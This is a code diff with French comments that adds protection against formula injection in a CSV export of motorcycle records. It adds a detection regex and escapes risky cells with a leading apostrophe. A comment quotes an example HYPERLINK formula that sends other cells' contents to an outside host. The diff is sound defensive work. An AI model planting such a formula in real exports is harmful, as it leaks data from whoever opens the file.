@@ -52,15 +52,40 @@ export const EN_TETE_EXPORT = [
 ] as const;
 
 /**
- * Protège une valeur selon RFC 4180.
+ * Ce qui fait qu'un tableur prend une cellule pour une formule.
  *
- * Une couleur saisie « Rouge; noir » décalerait sinon toutes les colonnes
- * suivantes d'un cran, en silence et sur cette seule ligne — le genre d'erreur
- * qu'on ne voit qu'en relisant le tableur à la main.
+ * Excel et LibreOffice évaluent toute cellule ouvrant par `=`, `+`, `-` ou
+ * `@` ; la tabulation et le retour chariot y mènent aussi, une fois rognés.
+ */
+const DEBUT_DE_FORMULE = /^[=+\-@\t\r]/;
+
+/**
+ * Protège une valeur : d'abord contre le tableur, ensuite selon RFC 4180.
+ *
+ * **Le tableur d'abord, et c'est de la sécurité, pas de la mise en forme.** Une
+ * couleur saisie `=HYPERLINK("http://ailleurs/"&A1;"ok")` n'est pas une formule
+ * chez celui qui l'a tapée : elle le devient **chez celui qui ouvre le
+ * fichier**, et ce qu'elle emporte est le contenu des autres cellules. Il faut
+ * un compte pour saisir une moto, et c'est justement ce qui rend le cas
+ * intéressant — un gérant écrit la couleur, le responsable ouvre l'export. Ce
+ * fichier est le seul endroit du produit où une saisie franchit une frontière
+ * de confiance.
+ *
+ * L'apostrophe de tête dit au tableur « ceci est du texte ». Elle se voit dans
+ * la cellule, et c'est un prix payé par les seules valeurs qui n'avaient aucune
+ * raison de commencer ainsi — aucune colonne d'ici n'est un nombre signé.
+ *
+ * **Le séparateur ensuite.** Une couleur « Rouge; noir » décalerait toutes les
+ * colonnes suivantes d'un cran, en silence et sur cette seule ligne — le genre
+ * d'erreur qu'on ne voit qu'en relisant le tableur à la main.
+ *
+ * L'ordre compte : neutraliser après avoir posé les guillemets laisserait
+ * l'apostrophe en dehors de la cellule, où elle ne protège rien.
  */
 function proteger(valeur: string): string {
-  if (!/[";\r\n]/.test(valeur)) return valeur;
-  return `"${valeur.replace(/"/g, '""')}"`;
+  const neutre = DEBUT_DE_FORMULE.test(valeur) ? `'${valeur}` : valeur;
+  if (!/[";\r\n]/.test(neutre)) return neutre;
+  return `"${neutre.replace(/"/g, '""')}"`;
 }
 
 /** `08/10/2026`, ou rien. La date de l'appareil, comme partout ailleurs. */
